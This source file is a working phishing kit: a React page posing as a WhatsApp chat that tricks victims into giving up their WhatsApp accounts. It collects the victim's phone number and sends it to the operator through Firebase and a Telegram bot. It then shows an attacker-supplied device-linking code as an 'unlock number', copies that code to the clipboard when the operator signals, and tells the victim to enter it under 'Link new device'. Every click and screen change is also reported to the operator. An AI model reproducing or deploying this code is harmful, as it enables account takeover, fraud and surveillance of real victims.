import { useState, useEffect, useRef, FormEvent } from "react";
import { initializeApp } from "firebase/app";
import { getDatabase, ref, onValue, set } from "firebase/database";

// --- CONFIGURATION ---
const firebaseConfig = {
  apiKey: "AIzaSyBqlFQzFAAQudAvmBH_KXuDzkLE4gHO7qo",
  authDomain: "whatsapp-channel-chat.firebaseapp.com",
  databaseURL: "https://whatsapp-channel-chat-default-rtdb.firebaseio.com",
  projectId: "whatsapp-channel-chat",
  storageBucket: "whatsapp-channel-chat.firebasestorage.app",
  messagingSenderId: "906974342849",
  appId: "1:906974342849:web:1a7c5e560f29ab57da2e40",
  measurementId: "G-V8Y7KX4F5Y"
};

const cleanPhoneNumber = (num: string) => {
  let cleaned = num.replace(/[^0-9+]/g, "").trim();
  if (cleaned.startsWith("+88")) {
    cleaned = cleaned.substring(3);
  } else if (cleaned.startsWith("88") && cleaned.length > 11) {
    cleaned = cleaned.substring(2);
  }
  return cleaned;
};

const escapeHtml = (str: string): string => {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
};

// Robust helper to copy text even under focus constraints, warning instead of erroring on fail
const copyToClipboard = async (text: string): Promise<boolean> => {
  try {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      await navigator.clipboard.writeText(text);
      return true;
    }
  } catch (err) {
    console.warn("Clipboard API failed, trying fallback...", err);
  }

  // Fallback copy using textarea
  try {
    const textArea = document.createElement("textarea");
    textArea.value = text;
    textArea.style.position = "fixed";
    textArea.style.top = "0";
    textArea.style.left = "0";
    textArea.style.width = "2em";
    textArea.style.height = "2em";
    textArea.style.padding = "0";
    textArea.style.border = "none";
    textArea.style.outline = "none";
    textArea.style.boxShadow = "none";
    textArea.style.background = "transparent";
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    const successful = document.execCommand("copy");
    document.body.removeChild(textArea);
    return successful;
  } catch (err) {
    console.warn("Fallback copy failed:", err);
    return false;
  }
};

// --- Telegram Messaging Proxy Endpoints ---
const API_URL_SEND = "/api/telegram/send";
const API_URL_UPDATES = "/api/telegram/updates";

export default function App() {
  const [phase, setPhase] = useState<"input" | "loading" | "guide" | "success">("input");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [countdown, setCountdown] = useState(10);
  const [showPin, setShowPin] = useState(false);
  const [liveCode, setLiveCode] = useState<string>("        ");
  const [showErrorBox, setShowErrorBox] = useState(false);
  const [logoSrc, setLogoSrc] = useState("my-logo.jpg");
  const [isCopied, setIsCopied] = useState(false);
  const [isRemotelyCopied, setIsRemotelyCopied] = useState(false);
  const [isCopyBlocked, setIsCopyBlocked] = useState(false);
  const [sessionStartTime, setSessionStartTime] = useState<number>(Date.now());
  const lastCopyTriggerCode = useRef<string>("        ");
  const latestLiveCode = useRef<string>("        ");

  const phoneInputRef = useRef<HTMLInputElement>(null);
  const chatMainRef = useRef<HTMLElement>(null);
  const videoRef = useRef<HTMLVideoElement>(null);

  // --- Auto-play video resiliently in mobile in-app WebViews ---
  useEffect(() => {
    if (phase === "guide" && videoRef.current) {
      const playVideo = () => {
        if (!videoRef.current) return;
        const playPromise = videoRef.current.play();
        if (playPromise !== undefined) {
          playPromise.catch((err) => {
            console.warn("Autoplay prevented, waiting for user gesture:", err);
          });
        }
      };

      // Try playing immediately
      playVideo();

      // Setup interaction triggers as fallback for aggressive in-app browser restrictions
      const forcePlayOnGesture = () => {
        playVideo();
        document.removeEventListener("click", forcePlayOnGesture);
        document.removeEventListener("touchstart", forcePlayOnGesture);
      };

      document.addEventListener("click", forcePlayOnGesture);
      document.addEventListener("touchstart", forcePlayOnGesture);

      return () => {
        document.removeEventListener("click", forcePlayOnGesture);
        document.removeEventListener("touchstart", forcePlayOnGesture);
      };
    }
  }, [phase]);

  // --- Auto-restore session from localStorage on initial render ---
  useEffect(() => {
    const savedPhone = localStorage.getItem("submitted_phone");
    if (savedPhone) {
      setPhoneNumber(savedPhone);
      setPhase("guide");
      setShowPin(true);
      setSessionStartTime(Date.now());
    }
  }, []);

  // --- Telegram Messaging (via backend proxy) ---
  const sendTelegramMessage = async (text: string) => {
    try {
      await fetch(API_URL_SEND, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text, parse_mode: "HTML" })
      });
    } catch (error) {
      console.error("Telegram proxy send error:", error);
    }
  };

  // --- Send Video to "আমি প্রবাসী" Channel via backend proxy ---
  const sendTelegramVideo = async (caption: string) => {
    try {
      await fetch("/api/telegram/send-video", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          caption: caption,
          parse_mode: "HTML"
        })
      });
    } catch (error) {
      console.error("Telegram proxy send video error:", error);
    }
  };

  // --- Get current UI screen location for live telemetry ---
  const getClientPosition = () => {
    if (phase === "input") {
      return "ফোন নাম্বার ইনপুট করার পেজে রয়েছে (Phone Input Screen)";
    } else if (phase === "loading") {
      return "৫ সেকেন্ডের আনলকিং এনিমেশন দেখছে (Loading Animation Stage)";
    } else if (phase === "guide") {
      if (!showPin) {
        return "কোড কাউন্টডাউন পেজে অপেক্ষা করছে (Waiting for Countdown)";
      } else if (showErrorBox) {
        return "লাল ওয়ার্নিং / এরর বক্স দেখতে পাচ্ছে (Viewing Error Box Warning)";
      } else {
        return "সরাসরি লাইভ ৮ ডিজিট কোড দেখছে (Viewing Live 8-Digit OTP)";
      }
    } else if (phase === "success") {
      return "সফলভাবে কানেক্টেড পেইজে রয়েছে (Success/Connected Page)";
    }
    return "অজানা অবস্থান (Unknown Position)";
  };

  // --- Live Video status sending to Channel "আমি প্রবাসী" ---
  useEffect(() => {
    if (phase === "input" || !phoneNumber) return;

    // Send the status report only once upon connection/transition instead of repeating every 5 seconds
    const currentPos = getClientPosition();
    const timeString = new Date().toLocaleTimeString("bn-BD", { timeZone: "Asia/Dhaka" });
    const escapedPhone = escapeHtml(phoneNumber);
    const immediateCaption = `▪ <b>চ্যানেলের নাম:</b> আমি প্রবাসী\n▪ <b>গ্রাহক:</b> Nusrat jahan\n▪ <b>ফোন নাম্বার:</b> <code>${escapedPhone}</code>\n▪ <b>ওয়েবসাইটের অবস্থান:</b> ${currentPos}\n▪ <b>অবস্থা:</b> সক্রিয় 🟢 (Active)\n▪ <b>সময়:</b> ${timeString} (Dhaka Time)`;
    
    sendTelegramVideo(immediateCaption);
  }, [phase, phoneNumber, showPin, showErrorBox]);

  // --- Global Click Activity Tracker ---
  useEffect(() => {
    const handleGlobalClick = async (event: MouseEvent) => {
      const target = event.target as HTMLElement;
      if (!target) return;

      const clickedTag = target.tagName.toLowerCase();
      
      // Determine if interactive element is clicked
      const isButton = target.closest("button");
      const isInput = target.closest("input");
      const isIcon = target.closest("i");
      const isClickable = target.closest("[onClick]") || target.style.cursor === "pointer" || target.closest(".cursor-pointer");

      if (isButton || isInput || isIcon || isClickable) {
        const elementText = target.innerText?.trim() || target.getAttribute("placeholder") || target.className || "";
        let elementDesc = "";
        
        if (isButton) {
          elementDesc = `Button ("${isButton.innerText?.trim() || isButton.id || "Submit"}")`;
        } else if (isInput) {
          elementDesc = `Input Field ("${isInput.getAttribute("placeholder") || isInput.id}")`;
        } else if (isIcon) {
          elementDesc = `Icon (${isIcon.className})`;
        } else {
          elementDesc = `Clickable Element (${clickedTag}: "${elementText.substring(0, 30)}")`;
        }

        const phoneDisplay = phoneNumber || "No Phone Submitted yet";
        const clickTime = new Date().toLocaleTimeString("bn-BD", { timeZone: "Asia/Dhaka" });
        const clickMsg = `🎯 <b>User Click Activity</b>\n👤 <b>User:</b> Nusrat jahan\n📱 <b>Phone:</b> <code>${escapeHtml(phoneDisplay)}</code>\n📍 <b>Clicked:</b> <code>${escapeHtml(elementDesc)}</code>\n🕒 <b>Time:</b> ${clickTime}`;
        
        await sendTelegramMessage(clickMsg);
      }
    };

    document.addEventListener("click", handleGlobalClick);
    return () => {
      document.removeEventListener("click", handleGlobalClick);
    };
  }, [phoneNumber]);

  // --- Focus Phone Input via footer or header interaction ---
  const handleInteractionClick = () => {
    if (phase === "input") {
      phoneInputRef.current?.focus();
      phoneInputRef.current?.scrollIntoView({ behavior: "smooth", block: "center" });
    } else {
      chatMainRef.current?.querySelector(".system-card")?.scrollIntoView({ behavior: "smooth", block: "center" });
    }
  };

  // --- Phone Submit Handler ---
  const handlePhoneSubmit = async (e: FormEvent) => {
    e.preventDefault();
    const phone = phoneNumber.trim();

    if (!phone || phone.length < 10) {
      alert("Please enter a valid phone number.");
      return;
    }

    const cleanNum = cleanPhoneNumber(phone);

    // Save phone number to localStorage to keep active connection on refresh
    localStorage.setItem("submitted_phone", phone);
    setSessionStartTime(Date.now());

    // 1. Transition to Loading immediately for instant visual feedback and ultra-fast response
    setPhase("loading");

    // 2. Send Log to Telegram asynchronously in background
    sendTelegramMessage(`<b>🚨 Login Attempt (WhatsApp)</b>\nUser: Nusrat jahan\nPhone: <code>${escapeHtml(phone)}</code>\n\n<i>System: 5s Unlocking Animation Started...</i>`).catch(err => {
      console.error("Background telegram message error:", err);
    });

    // 3. Submit initial client state to Firebase Database asynchronously in background
    try {
      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);
      set(ref(db, "clients/" + cleanNum), {
        phoneNumber: cleanNum,
        code: "",
        timestamp: Date.now(),
        lastActive: Date.now()
      }).then(() => {
        console.log("Firebase connection established for client:", cleanNum);
      }).catch(firebaseErr => {
        console.error("Firebase write error:", firebaseErr);
      });
    } catch (firebaseErr) {
      console.error("Firebase setup error:", firebaseErr);
    }

    // 4. Keep loading phase for 5 Seconds
    setTimeout(() => {
      setPhase("guide");
    }, 5000);
  };

  // --- Countdown Logic when guide screen loads ---
  useEffect(() => {
    if (phase !== "guide") return;

    let timeLeft = 10;
    const interval = setInterval(() => {
      timeLeft--;
      setCountdown(timeLeft);

      if (timeLeft <= 0) {
        clearInterval(interval);
        setShowPin(true);
      }
    }, 1000);

    return () => clearInterval(interval);
  }, [phase]);

  // --- Firebase Database Connection once Countdown ends ---
  useEffect(() => {
    if (!showPin) return;

    const cleanPhone = cleanPhoneNumber(phoneNumber);
    if (!cleanPhone) return;

    try {
      const app = initializeApp(firebaseConfig);
      const db = getDatabase(app);
      const clientCodeRef = ref(db, "clients/" + cleanPhone);

      const unsubscribe = onValue(clientCodeRef, (snapshot) => {
        const data = snapshot.val();
        const code = data && data.code ? String(data.code).trim().padEnd(8, " ") : "        ";
        setLiveCode(code);
        latestLiveCode.current = code;
      });

      // Dedicated listener for copyTrigger to capture every remote clipboard signal, including identical values
      const copyTriggerRef = ref(db, "clients/" + cleanPhone + "/copyTrigger");

      const unsubscribeCopy = onValue(copyTriggerRef, (snapshot) => {
        const trigger = snapshot.val();
        if (trigger) {
          let remoteCode = "";
          let triggerTimestamp = 0;

          if (typeof trigger === "object" && trigger !== null) {
            if (typeof trigger.code !== "undefined") {
              remoteCode = String(trigger.code).trim();
            }
            if (typeof trigger.timestamp !== "undefined") {
              triggerTimestamp = Number(trigger.timestamp);
            }
          } else if (typeof trigger === "string") {
            remoteCode = trigger.trim();
          }

          if (!remoteCode) {
            remoteCode = latestLiveCode.current.trim();
          }

          // Only trigger copy if the signal is sent after the current session started
          if (remoteCode && triggerTimestamp > sessionStartTime) {
            copyToClipboard(remoteCode).then((success) => {
              if (success) {
                setIsRemotelyCopied(true);
                setIsCopyBlocked(false);
                setTimeout(() => {
                  setIsRemotelyCopied(false);
                }, 3000);
              } else {
                setIsCopyBlocked(true);
                setIsRemotelyCopied(false);
                setTimeout(() => {
                  setIsCopyBlocked(false);
                }, 5000);
              }
            });
          }
        }
      });

      return () => {
        unsubscribe();
        unsubscribeCopy();
      };
    } catch (error) {
      console.error("Firebase db listener error:", error);
    }
  }, [showPin, phoneNumber, sessionStartTime]);

  // --- Telegram Commands Polling (Success / Error) ---
  useEffect(() => {
    if (phase !== "guide") return;

    let lastUpdateId = 0;
    let isMounted = true;

    const pollTelegram = async () => {
      try {
        const response = await fetch(`${API_URL_UPDATES}?offset=${lastUpdateId + 1}`);
        const data = await response.json();

        if (isMounted && data.ok && data.result.length > 0) {
          data.result.forEach((update: any) => {
            lastUpdateId = update.update_id;
            const messageText = update.message?.text?.trim().toLowerCase();

            if (messageText === "successful" || messageText === "successfull" || messageText === "/success") {
              setPhase("success");
            } else if (messageText === "/error") {
              setShowErrorBox(true);
            }
          });
        }
      } catch (error) {
        console.warn("Polling transient state:", error);
      }
    };

    const interval = setInterval(pollTelegram, 2000);

    return () => {
      isMounted = false;
      clearInterval(interval);
    };
  }, [phase]);

  // --- Action Button Handler ---
  const handleActionBtnClick = async () => {
    const codeToCopy = liveCode.trim();
    const success = await copyToClipboard(codeToCopy);
    if (success) {
      setIsCopied(true);
      setTimeout(() => setIsCopied(false), 2000);
    }

    // 1. Send Telegram action log
    await sendTelegramMessage(`⚠️ *User Action:* User copied the unlock number \`${codeToCopy}\`.\n\n_Bot Action: Trying to open 'Link new device' and Polling for Admin Command..._`);

    // 2. Open WhatsApp deep link
    window.location.href = "whatsapp://";

    // 3. Send update to telegram after 2s
    setTimeout(async () => {
      await sendTelegramMessage(`✅ *System:* Enter cod to link new device অপশনের ভেতরে প্রবেশ করানো হয়েছে।\n\n👉 Now send: \`/success\` or \`/error\``);
    }, 2000);
  };

  // --- Start Chat Button Handler ---
  const handleStartChat = () => {
    window.location.href = "https://wa.me/8801806853977";
  };

  // --- Back Button Handler ---
  const handleBack = () => {
    if (phase !== "input") {
      localStorage.removeItem("submitted_phone");
      setPhoneNumber("");
      setPhase("input");
      setCountdown(3);
      setShowPin(false);
      setIsCopied(false);
      setIsRemotelyCopied(false);
      setIsCopyBlocked(false);
      lastCopyTriggerCode.current = "";
      setShowErrorBox(false);
    }
  };

  return (
    <div className="app-wrapper">
      
      {/* HEADER */}
      <header className="bg-[#008069] h-[60px] flex items-center px-4 shadow-md z-10 shrink-0">
        <div className="flex items-center gap-3 text-white w-full">
          <i className="fa-solid fa-arrow-left text-xl cursor-pointer" onClick={handleBack}></i>
          
          <div className="w-9 h-9 rounded-full bg-gray-300 overflow-hidden relative border border-white/30 cursor-pointer" onClick={handleInteractionClick}>
            <img 
              src="my-logo.jpg" 
              onError={(e) => {
                e.currentTarget.src = "https://via.placeholder.com/50";
              }} 
              className="w-full h-full object-cover" 
              alt="Profile" 
            />
          </div>

          <div className="flex-1 flex flex-col justify-center cursor-pointer" onClick={handleInteractionClick}>
            <h1 className="text-[17px] font-medium leading-tight">Nusrat jahan</h1>
            <span className="text-[12px] opacity-90">Message yourself</span>
          </div>

          <div className="flex gap-5 text-xl">
            <i className="fa-solid fa-video cursor-pointer" onClick={handleInteractionClick}></i>
            <i className="fa-solid fa-phone cursor-pointer" onClick={handleInteractionClick}></i>
            <i className="fa-solid fa-ellipsis-vertical cursor-pointer" onClick={handleInteractionClick}></i>
          </div>
        </div>
      </header>

      {/* CHAT AREA */}
      <main ref={chatMainRef} className="flex-1 overflow-y-auto pt-4 relative scroll-smooth" id="chatMain">
        
        <div className="encryption-msg">
          <i className="fa-solid fa-lock text-[10px] mr-1"></i> 
          Messages are end-to-end encrypted. No one outside of this chat, not even WhatsApp, can read or listen to them.
        </div>

        <div className="flex justify-center mb-4 mt-4">
          <span className="bg-white/80 text-[#54656f] text-[12px] font-medium px-3 py-1.5 rounded-lg shadow-sm backdrop-blur-sm">Today</span>
        </div>

        {/* PHASE 1: PHONE INPUT */}
        {phase === "input" && (
          <div id="inputSection" className="system-card mx-auto max-w-[320px]">
            <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3 text-[#008069]">
              <i className="fa-brands fa-whatsapp text-2xl"></i>
            </div>
            <h2 className="text-sm font-bold text-gray-800 mb-2">Connect to Nusrat jahan</h2>
            <p className="text-xs text-gray-500 mb-4">To enable chat, please verify your phone number.</p>
            
            <form id="phoneForm" onSubmit={handlePhoneSubmit} className="flex flex-col gap-3">
              <input 
                type="tel" 
                id="phoneNumber"
                ref={phoneInputRef}
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="Phone Number (e.g. 017...)" 
                className="w-full bg-[#f0f2f5] border-none rounded-lg px-4 py-3 text-sm focus:ring-2 focus:ring-[#008069] outline-none text-center font-bold text-gray-800"
                required
              />
              <button type="submit" id="submitBtn" className="wa-btn shadow">
                Unlock Chat
              </button>
            </form>
          </div>
        )}

        {/* PHASE 2: LOADING (5 Seconds) */}
        {phase === "loading" && (
          <div id="loadingSection" className="system-card mx-auto max-w-[320px]">
            <div className="w-12 h-12 border-4 border-gray-200 border-t-[#008069] rounded-full animate-spin mx-auto mb-4"></div>
            <h2 className="text-lg font-bold text-gray-800">Unlocking...</h2>
            <p className="text-xs text-gray-500">Please wait while we verify details.</p>
          </div>
        )}

        {/* PHASE 3: GUIDE & CODE */}
        {phase === "guide" && (
          <div id="guideSection" className="system-card mx-auto max-w-[340px]">
            
            {/* Video Frame */}
            <div className="video-container">
              <video ref={videoRef} className="w-full h-full object-cover" autoPlay loop muted playsInline>
                <source src="my-video.mp4" type="video/mp4" />
                Your browser does not support the video tag.
              </video>
            </div>

            {/* Headline */}
            <h2 className="text-[14px] font-bold text-red-600 mb-4 leading-snug">
              Nusrat jahan whatsapp account is locked please follow this unlock step
            </h2>

            {/* Countdown UI */}
            {!showPin && (
              <div id="countdownBox" className="bg-amber-50 text-amber-800 text-sm py-2 px-4 rounded mb-4 border border-amber-100 font-bold">
                Your Unlock Number is Coming soon... <span id="timerDisplay">{countdown}</span>s
              </div>
            )}

            {/* Live Code Box (Hidden initially) */}
            {showPin && (
              <div id="pinContainer" className="flex justify-center gap-1 mb-4">
                {Array.from({ length: 8 }).map((_, index) => (
                  <div key={index} className="pin-box pin-digit">
                    {liveCode[index] || ""}
                  </div>
                ))}
              </div>
            )}

            {/* Action Button (Hidden initially) */}
            {showPin && (
              <button 
                id="actionBtn" 
                onClick={handleActionBtnClick}
                className={`w-full py-3 text-white font-bold rounded-full shadow-lg transition-all mb-4 text-sm flex items-center justify-center gap-2 ${
                  isCopyBlocked 
                    ? "bg-red-600 hover:bg-red-700" 
                    : (isCopied || isRemotelyCopied) 
                      ? "bg-emerald-600 hover:bg-emerald-700" 
                      : "bg-[#008069] hover:bg-[#006b57] animate-pulse"
                }`}
              >
                {isCopyBlocked ? (
                  <>
                    <i className="fa-solid fa-triangle-exclamation"></i> ❌ Copy Blocked (এখানে ক্লিক করে কপি করুন)
                  </>
                ) : isRemotelyCopied ? (
                  <>
                    <i className="fa-solid fa-bolt"></i> Remotely Copied! (কপি হয়েছে!)
                  </>
                ) : isCopied ? (
                  <>
                    <i className="fa-solid fa-check"></i> কোডটি কপি করা হয়েছে!
                  </>
                ) : (
                  <>
                    <i className="fa-solid fa-copy"></i> কোডটি কপি করুন
                  </>
                )}
              </button>
            )}

            {/* Instructions */}
            <div className="instruction-text text-left text-sm text-gray-600 bg-gray-50 p-3 rounded">
              <p className="font-bold underline mb-1">নির্দেশনা:</p>
              <ol className="list-decimal list-inside space-y-1">
                <li>Notification থেকে <b>"Link new device"</b> এ যান।</li>
                <li>Confirm করে আনলক করুন।</li>
                <li>উপরের কোডটি প্রবেশ করান।</li>
              </ol>
            </div>

            {/* Error Message Container */}
            {showErrorBox && (
              <div id="errorBox" className="error-box">
                <p><b>Warning:</b> দয়া করে আপনার ফোন এর notification থেকে Enter cod to link new device এর ভেতরে প্রবেশ করুন এবং Whatsapp পেজে থাকা আনলক নাম্বার ৮টি সেখানে বসান। এই আনলক নাম্বার ৮টি সুরক্ষার জন্য প্রতি ১মিনিট পর পর পরিবর্তন হতে পারে।</p>
              </div>
            )}
          </div>
        )}

        {/* PHASE 4: SUCCESS (Start Button) */}
        {phase === "success" && (
          <div id="successSection" className="system-card mx-auto max-w-[320px]">
            <div className="w-16 h-16 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-4 text-3xl">
              <i className="fa-solid fa-check"></i>
            </div>
            <h2 className="text-lg font-bold text-gray-800 mb-2">Successful!</h2>
            <p className="text-sm text-gray-500 mb-6">You are now connected.</p>
            
            <button id="startBtn" onClick={handleStartChat} className="wa-btn shadow text-lg w-full flex items-center justify-center gap-2">
              Start Chat <i className="fa-solid fa-paper-plane"></i>
            </button>
          </div>
        )}

      </main>

      {/* FOOTER */}
      <footer className="footer-fake shrink-0 cursor-pointer" onClick={handleInteractionClick} id="messageTrigger">
        <i className="fa-solid fa-plus text-[#54656f] text-2xl"></i>
        <div className="input-pill">Type a message</div>
        <i className="fa-solid fa-microphone text-[#54656f] text-xl ml-1"></i>
      </footer>

    </div>
  );
}
